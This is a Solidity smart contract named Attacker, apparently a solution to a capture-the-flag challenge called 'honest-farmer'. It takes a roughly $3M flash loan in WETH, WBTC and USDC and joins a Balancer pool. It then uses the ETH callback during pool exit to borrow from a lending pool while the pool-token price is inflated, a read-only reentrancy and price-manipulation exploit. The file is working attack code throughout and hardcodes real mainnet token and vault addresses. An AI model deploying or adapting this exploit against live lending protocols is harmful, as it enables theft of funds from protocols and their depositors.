// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {IFlashLoanReceiver} from "./interfaces/IFlashLoanReceiver.sol";
import {IPool} from "./interfaces/IPool.sol";
import {IWETH} from "./interfaces/IWETH.sol";

import {IBalancerPool} from "./interfaces/IBalancerPool.sol";
import {IBalancerVault} from "./interfaces/IBalancerVault.sol";

import {LendingPool} from "src/honest-farmer/LendingPool.sol";

contract Attacker is IFlashLoanReceiver {

    LendingPool private immutable _lendingPool;

    uint256 private constant _amountToBorrow = 10 ether;

    address private constant _WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address private constant _WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address private constant _USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;

    address private constant _BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant _BALANCER_POOL = 0x64541216bAFFFEec8ea535BB71Fbc927831d0595;

    IPool private constant _POOL = IPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    constructor(LendingPool _pool) {
        _lendingPool = _pool;
    }

    function executeAttack() external {

        address[] memory _assets = new address[](3);
        _assets[0] = address(_WETH);
        _assets[1] = address(_WBTC);
        _assets[2] = address(_USDC);

        // note: keeping the value here the same is important to minimize slippage
        uint256[] memory _amounts = new uint256[](3);
        _amounts[0] = 342 * 10 ** IERC20Metadata(_WETH).decimals(); // ~$1M
        _amounts[1] = 20 * 10 ** IERC20Metadata(_WBTC).decimals(); // ~$1M
        _amounts[2] = 1_000_000 * 10 ** IERC20Metadata(_USDC).decimals(); // ~$1M

        uint256[] memory _modes = new uint256[](_assets.length);

        // 0 = no debt (flash), 1 = stable, 2 = variable
        for (uint256 i = 0; i < _assets.length; i++) _modes[i] = 0;

        _POOL.flashLoan(
            address(this),
            _assets,
            _amounts,
            _modes,
            address(this),
            "",
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator
        bytes calldata // params
    ) external override returns (bool) {
        //
        // This contract now has the funds requested.
        //

        _addLiquidity();

        uint256 _collateralToDeposit = _lendingPool.getDepositRequired(_amountToBorrow) / 5; // we inflate the price of BPT by >5x
        _removeLiquidity(IERC20Metadata(_BALANCER_POOL).balanceOf(address(this)) - _collateralToDeposit);

        IWETH(_WETH).deposit{value: address(this).balance}();

        _swap(_WETH, _WBTC, IERC20Metadata(_WETH).balanceOf(address(this)) - amounts[0] - premiums[0]);
        _swap(_WBTC, _USDC, IERC20Metadata(_WBTC).balanceOf(address(this)) - amounts[1] - premiums[1]);
        _swap(_USDC, _WETH, IERC20Metadata(_USDC).balanceOf(address(this)) - amounts[2] - premiums[2]);

        //
        // ----------------------------------------
        //

        // At the end of the logic above, this contract owes the flashloaned amounts + premiums.
        // Therefore ensure that the contract has enough to repay these amounts.

        // Approve the LendingPool contract allowance to *pull* the owed amount
        for (uint256 i = 0; i < assets.length; i++) {
            IERC20Metadata(assets[i]).approve(address(_POOL), (amounts[i] + premiums[i]));
        }

        require(IERC20Metadata(_WETH).balanceOf(address(this)) > 0, "Attacker: Didn't make any profit");

        return true;
    }

    function _addLiquidity() private {
        address _poolAddress = _BALANCER_POOL;
        bytes32 _poolId = IBalancerPool(_poolAddress).getPoolId();
        IBalancerVault _vault = IBalancerVault(_BALANCER_VAULT);

        (address[] memory _tokens,,) = _vault.getPoolTokens(_poolId);

        uint256[] memory _amounts = new uint256[](_tokens.length);
        for (uint256 _i = 0; _i < _tokens.length; _i++) {
            uint256 _amount = IERC20Metadata(_tokens[_i]).balanceOf(address(this));
            _amounts[_i] = _amount;
            IERC20Metadata(_tokens[_i]).approve(address(_vault), _amount);
        }

        uint256[] memory _noBptAmounts = _isComposablePool(_tokens, _poolAddress) ? _dropBptItem(_tokens, _amounts, _poolAddress) : _amounts;

        _vault.joinPool(
            _poolId,
            address(this), // sender
            address(this), // recipient
            IBalancerVault.JoinPoolRequest({
                assets: _tokens,
                maxAmountsIn: _amounts,
                userData: abi.encode(
                    IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,
                    _noBptAmounts, // amountsIn
                    0 // minimumBPT
                ),
                fromInternalBalance: false
            })
        );
    }

    function _removeLiquidity(uint256 _amount) private {
        bytes32 _poolId = IBalancerPool(_BALANCER_POOL).getPoolId();
        IBalancerVault _vault = IBalancerVault(_BALANCER_VAULT);

        (address[] memory _tokens,,) = _vault.getPoolTokens(_poolId);
        for (uint256 _i = 0; _i < _tokens.length; _i++) {
            if (_tokens[_i] == _WETH) {
                _tokens[_i] = address(0); // address(0) is used to represent ETH
                break;
            }
        }

        uint256[] memory _amounts = new uint256[](_tokens.length);
        _vault.exitPool(
            _poolId,
            address(this), // sender
            payable(address(this)), // recipient
            IBalancerVault.ExitPoolRequest({
                assets: _tokens,
                minAmountsOut: _amounts,
                userData: abi.encode(
                    IBalancerVault.ExitKind.EXACT_BPT_IN_FOR_TOKENS_OUT,
                    _amount // bptAmountIn
                ),
                toInternalBalance: false
            })
        );
    }

    function _swap(address _fromToken, address _toToken, uint256 _amount) internal returns (uint256 _amountReceived) {
        bytes32 _poolId = IBalancerPool(_BALANCER_POOL).getPoolId();
        IBalancerVault _vault = IBalancerVault(_BALANCER_VAULT);
        
        IERC20Metadata(_fromToken).approve(address(_vault), _amount);
        _amountReceived = _vault.swap(
            IBalancerVault.SingleSwap({
                poolId: _poolId,
                kind: IBalancerVault.SwapKind.GIVEN_IN,
                assetIn: _fromToken,
                assetOut: _toToken,
                amount: _amount,
                userData: new bytes(0)
            }),
            IBalancerVault.FundManagement({
                sender: address(this),
                fromInternalBalance: false,
                recipient: payable(address(this)),
                toInternalBalance: false
            }),
            0,
            block.timestamp
        );
    }

    function _borrowFunds() private {
        IERC20Metadata(_BALANCER_POOL).approve(address(_lendingPool), type(uint256).max);
        _lendingPool.borrow(_amountToBorrow, address(this));
    }

    function _isComposablePool(address[] memory _tokens, address _poolAddress) internal pure returns (bool) {
        for(uint256 i = 0; i < _tokens.length; i++) {
            if (_tokens[i] == _poolAddress) {
                return true;
            }
        }
        return false;
    }
    
    function _dropBptItem(address[] memory _tokens, uint256[] memory _amounts, address _poolAddress) internal pure returns (uint256[] memory) {
        uint256[] memory _noBPTAmounts = new uint256[](_tokens.length - 1);
        uint256 _j = 0;
        for(uint256 _i = 0; _i < _tokens.length; _i++) {
            if (_tokens[_i] != _poolAddress) {
                _noBPTAmounts[_j] = _amounts[_i];
                _j++;
            }
        }
        return _noBPTAmounts;
    }

    receive() external payable {
        _borrowFunds();
    }
}